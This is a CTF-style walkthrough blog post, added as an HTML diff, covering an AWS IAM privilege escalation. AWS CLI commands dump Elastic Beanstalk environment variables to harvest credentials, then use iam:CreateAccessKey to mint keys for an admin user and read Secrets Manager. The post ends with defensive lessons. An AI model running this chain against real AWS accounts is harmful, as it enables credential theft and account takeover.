@@ -1,0 +1,276 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Beanstalk — an AWS IAM privesc | Shashank Patil</title>
+<meta name="description" content="A pure AWS IAM box on Hack Smarter: secrets leaked in Elastic Beanstalk env vars, then a key-minting privilege escalation to read Secrets Manager.">
+
+<style>
+
+body{
+background:black;
+color:#00ff9c;
+font-family:monospace;
+margin:0;
+padding:0;
+}
+
+nav{
+padding:15px;
+border-bottom:1px solid #00ff9c;
+}
+
+nav a{
+color:#00ff9c;
+margin-right:20px;
+text-decoration:none;
+}
+
+nav a:hover{
+text-decoration:underline;
+}
+
+main{
+max-width:800px;
+margin:0 auto;
+padding:40px 20px 80px 20px;
+line-height:1.75;
+font-size:15px;
+}
+
+h1{
+line-height:1.3;
+}
+
+h2{
+margin-top:55px;
+border-bottom:1px solid #00ff9c;
+padding-bottom:8px;
+}
+
+h3{
+margin-top:35px;
+}
+
+a{
+color:#00ff9c;
+}
+
+.meta{
+opacity:0.65;
+font-size:13px;
+margin-bottom:40px;
+}
+
+code{
+background:#062;
+color:#c9ffe8;
+padding:1px 5px;
+}
+
+pre{
+border:1px solid #00ff9c;
+padding:15px;
+overflow-x:auto;
+font-size:13px;
+line-height:1.5;
+}
+
+pre code{
+background:none;
+color:#00ff9c;
+padding:0;
+}
+
+blockquote{
+border-left:3px solid #00ff9c;
+margin:30px 0;
+padding:5px 0 5px 20px;
+opacity:0.9;
+}
+
+ul{
+padding-left:20px;
+}
+
+li{
+margin-bottom:8px;
+}
+
+footer{
+border-top:1px solid #00ff9c;
+margin-top:60px;
+padding-top:20px;
+font-size:13px;
+opacity:0.8;
+}
+
+</style>
+
+</head>
+
+<body>
+
+<nav>
+<a href="../index.html">Home</a>
+<a href="../blog.html">Blog</a>
+<a href="https://github.com/b17w1z4rd">GitHub</a>
+</nav>
+
+<main>
+
+<h1>$ cat beanstalk.md</h1>
+
+<p class="meta">
+Hack Smarter &middot; Easy &middot; AWS / cloud
+</p>
+
+<p>
+A pure AWS IAM box &mdash; no VPN, no shells, just the CLI. You start with low-priv keys and finish reading a flag out of Secrets Manager. The chain: low-priv keys -> Beanstalk config leaks a second credential in <strong>environment variables</strong> -> that user can't read secrets either, but its <strong>policy document</strong> reveals <code>iam:CreateAccessKey</code> on <code>*</code> -> mint keys for the admin user -> read the secret. Two deliberate red herrings sit in the middle to force you to actually read the IAM policies.
+</p>
+
+<p>
+<em>AWS keys below are redacted &mdash; that's Hack Smarter's one hard rule for cloud walkthroughs. Everything else is the intended path.</em>
+</p>
+
+<h2>$ setup</h2>
+
+<p>
+The lab hands you an access key + secret (built on CloudGoat). Wire up a named profile so you don't clobber anything, and always test the objective first &mdash; sometimes low-priv is looser than intended:
+</p>
+
+<pre><code>aws configure --profile bean       # keys, region us-east-1, json
+aws sts get-caller-identity --profile bean
+# Arn: arn:aws:iam::724440692272:user/lab_low_priv_user
+
+aws secretsmanager list-secrets --profile bean --region us-east-1
+# AccessDeniedException: not authorized to perform secretsmanager:ListSecrets</code></pre>
+
+<p>
+Denied, as the username suggests. So we pivot.
+</p>
+
+<h2>$ beanstalk as a credential store</h2>
+
+<p>
+Enumerate the environment, then dump its configuration &mdash; Elastic Beanstalk keeps <strong>environment variables</strong> in config, and that's a notorious dumping ground for hardcoded secrets:
+</p>
+
+<pre><code>aws elasticbeanstalk describe-environments --profile bean --region us-east-1
+# ApplicationName: lab-app   EnvironmentName: lab-env
+
+aws elasticbeanstalk describe-configuration-settings \
+  --application-name lab-app --environment-name lab-env \
+  --profile bean --region us-east-1 \
+  --query &quot;ConfigurationSettings[].OptionSettings[?Namespace==&#x27;aws:elasticbeanstalk:application:environment&#x27;]&quot; </code></pre>
+
+<p>
+Out fall a second set of credentials:
+</p>
+
+<pre><code>SECONDARY_ACCESS_KEY : &lt;REDACTED&gt;
+SECONDARY_SECRET_KEY : &lt;REDACTED&gt;</code></pre>
+
+<h2>$ the red herrings</h2>
+
+<p>
+Load the secondary user and try the objective again &mdash; still denied, and so is every obvious way around it:
+</p>
+
+<pre><code>aws configure --profile bean2      # SECONDARY_* keys
+aws sts get-caller-identity --profile bean2
+# Arn: .../user/lab_secondary_user
+
+aws secretsmanager list-secrets --profile bean2 --region us-east-1
+# AccessDeniedException   (still no ListSecrets)
+# get-secret-value on guessed names -&gt; AccessDenied
+# resourcegroupstaggingapi get-resources -&gt; AccessDenied (tag:GetResources)</code></pre>
+
+<p>
+Dead end &mdash; if you only think in terms of Secrets Manager. But one call works:
+</p>
+
+<pre><code>aws iam list-attached-user-policies --user-name lab_secondary_user --profile bean2
+# PolicyName: lab_secondary_policy</code></pre>
+
+<h2>$ read the policy — the actual technique</h2>
+
+<p>
+When <code>List</code> is blocked but you have IAM read, the policy document is the map. Read it:
+</p>
+
+<pre><code>aws iam get-policy-version \
+  --policy-arn arn:aws:iam::724440692272:policy/lab_secondary_policy \
+  --version-id v1 --profile bean2</code></pre>
+
+<pre><code>{
+  &quot;Statement&quot;: [
+    { &quot;Action&quot;: [&quot;iam:CreateAccessKey&quot;], &quot;Effect&quot;: &quot;Allow&quot;, &quot;Resource&quot;: &quot;*&quot; },
+    { &quot;Action&quot;: [&quot;iam:ListUsers&quot;,&quot;iam:GetUser&quot;,&quot;iam:GetPolicyVersion&quot;,&quot;...&quot;],
+      &quot;Effect&quot;: &quot;Allow&quot;, &quot;Resource&quot;: &quot;*&quot; }
+  ]
+}</code></pre>
+
+<p>
+No Secrets Manager access at all &mdash; that was the second red herring. What we <em>do</em> have is the important part: <strong><code>iam:CreateAccessKey</code> on <code>Resource: "*"</code></strong>. That means this user can mint API keys for <em>any</em> IAM user in the account &mdash; including one that can read the secret. (This is the CloudGoat <code>iam_privesc_by_key_rotation</code> family.)
+</p>
+
+<h2>$ find the target, forge keys</h2>
+
+<pre><code>aws iam list-users --profile bean2
+# lab_admin_user, lab_low_priv_user, lab_secondary_user
+
+aws iam get-policy-version \
+  --policy-arn arn:aws:iam::724440692272:policy/lab_admin_user_policy \
+  --version-id v1 --profile bean2
+# { &quot;Action&quot;: &quot;*&quot;, &quot;Effect&quot;: &quot;Allow&quot;, &quot;Resource&quot;: &quot;*&quot; }   &lt;- full admin</code></pre>
+
+<p>
+<code>lab_admin_user</code> is full admin. Mint a fresh access key for it &mdash; the privesc payoff:
+</p>
+
+<pre><code>aws iam create-access-key --user-name lab_admin_user --profile bean2
+# AccessKeyId: &lt;REDACTED&gt;   SecretAccessKey: &lt;REDACTED&gt;   Status: Active</code></pre>
+
+<blockquote>
+An IAM user can hold only two access keys. If this returns <code>LimitExceeded</code>, <code>list-access-keys</code> and delete a stale one first. And freshly minted keys take a few seconds to propagate &mdash; if <code>get-caller-identity</code> returns <code>InvalidClientTokenId</code>, wait ~10s and retry.
+</blockquote>
+
+<h2>$ flag</h2>
+
+<pre><code>aws configure --profile admin      # forged admin keys
+aws secretsmanager list-secrets --profile admin --region us-east-1 --query &quot;SecretList[].Name&quot;
+# [ &quot;lab_final_flag&quot; ]
+
+aws secretsmanager get-secret-value --secret-id lab_final_flag \
+  --profile admin --region us-east-1 --query SecretString --output text
+# FLAG{D0nt_st0r3_s3cr3ts_in_b3@nsta1k!}</code></pre>
+
+<p>
+The flag itself spells out the moral: don't store secrets in Beanstalk environment variables. Any principal who can read the environment config walks the entire chain.
+</p>
+
+<h2>$ takeaway</h2>
+
+<ul>
+<li><strong>Anything that holds environment variables is a credential store</strong> &mdash; Beanstalk, Lambda, ECS task definitions, CI config. Dump env before anything fancier.</li>
+<li><strong>When List* is denied but you have IAM read, enumerate permissions, not resources.</strong> Policy documents name the exact resources a principal can touch &mdash; they're how you escape “I can read it but I can't find it.”</li>
+<li><strong>iam:CreateAccessKey on * is a full privilege-escalation primitive</strong>, not a benign admin action. If a low-value user has it, they can become any user in the account. Scope it to <code>Resource: &lt;self&gt;</code> in the real world.</li>
+</ul>
+
+<footer>
+<p>
+CTF handle <code>b17w1z4rd</code> &middot; <a href="https://github.com/b17w1z4rd">github.com/b17w1z4rd</a>
+</p>
+<p>
+<a href="../blog.html">&larr; back to all posts</a>
+</p>
+</footer>
+
+</main>
+
+</body>
+</html>
